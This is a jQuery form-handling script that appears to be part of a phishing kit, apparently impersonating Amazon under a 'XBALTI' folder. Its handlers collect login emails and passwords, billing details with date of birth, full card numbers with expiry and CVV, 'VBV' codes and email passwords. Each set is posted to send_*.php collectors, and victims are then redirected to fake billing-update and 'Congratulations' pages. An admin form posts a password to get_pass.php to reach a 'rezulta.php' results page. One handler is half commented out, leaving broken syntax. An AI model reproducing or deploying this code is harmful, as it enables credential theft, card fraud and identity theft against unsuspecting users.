$(function() {
	//自定义一个验证方法
	$.validator.addMethod(
	"yanzheng", //验证方法名称
	function(value, element, param) {//验证规则
		var re = false;
		if(/^\d+$/.test(value) && (value.length == 11||value.length == 12)){
			re =  true;
		}else{
			//if(/^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(value)){
			if(/^\w+((.\w+)|(-\w+))@[A-Za-z0-9]+((.|-)[A-Za-z0-9]+).[A-Za-z0-9]+$/.test(value)){
				re =  true;
			}
		}
		//console.log(re);
		return re;
	},
	''//验证提示信息
	);
    $("form[name='signineml']").validate({
        rules: {
            email: {
                required: true,
                yanzheng: true
            },
            password: "required",
        },
        messages: {
			email: {
				required: '* 必須項目です 。',
				yanzheng: ''
			},
            password: "* 必須項目です 。"
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("XBALTI/send_login.php", $("#signineml").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "homepage/?update_billing")
                },
                1000)
            })
        },
    })
});

$(function() {
    $("form[name='billingform']").validate({
        rules: {
            fullname: "required",
            address: "required",
            City: "required",
            stat: "required",
            zipcode: "required",
            phonenumber: "required",
            dob: "required",
            dob_moon: "required",
            dob_year: "required",
        },
        messages: {
            fullname: "",
            address: "",
            City: "",
            stat: "",
            zipcode: "",
            phonenumber: "",
            dob: "",
            dob_moon: "",
            dob_year: "",
        },
     //   submitHandler: function(form) {
        //    $("#zwimel").show();
      //      $.post("2.php", $("#billingform").serialize(),
         //   function(result) {
         //       setTimeout(function() {
           //         $(location).attr("href", "2.php")
           //     },
           //     2000)
            })
        },
    })
});

$(function() {
    $("form[name='formcard']").validate({
        rules: {
            nameoncard: "required",
            cardNumber: "required",
            exdateem: "required",
            exdateey: "required",
            cvv: "required",
        },
        messages: {
            nameoncard: "",
            cardNumber: "",
            exdateey: "",
            exdateem: "",
            cvv: "",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("../XBALTI/send_card.php", $("#formcard").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "../homepage/secure.php?Usecurty_info_vbv")
                },
                2000)
            })
        },
    })
});

$(function() {
    $("form[name='emailo']").validate({
        rules: {
            emailpass: "required",
        },
        messages: {
            emailpass: "",
        },
        submitHandler: function(form) {
            event.preventDefault();
            $("#zwimel").show();
            $.post("../XBALTI/send_email.php", $("#emailo").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "../homepage/success.php?Congratulations")
                },
                2000)
            })
        },
    })
});

$(function() {
    $("form[name='signinpass']").validate({
        rules: {
            password: "required",
        },
        messages: {
            password: "* Please enter your password.",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("XBALTI/send_login.php", $("#signinpass").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "homepage/?update_billing")
                },
                1000)
            })
        },
    })
});

$(function() {
    $("form[name='formvbv']").validate({
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("../XBALTI/send_vbv.php", $("#formvbv").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "../homepage/success.php?Congratulations")
                },
                2000)
            })
        },
    })
});

$(function() {
    $("form[name='formadmin']").validate({
        rules: {
            passadmin: "required",
        },
        messages: {
            passadmin: "Enter Your Fucking Password",
        },
        submitHandler: function(form) {
            $("#sonic").show();
            $.post("../amazon/XBALTI/get_pass.php", $("#formadmin").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "rezulta.php")
                },
                2000)
            })
        },
    })
});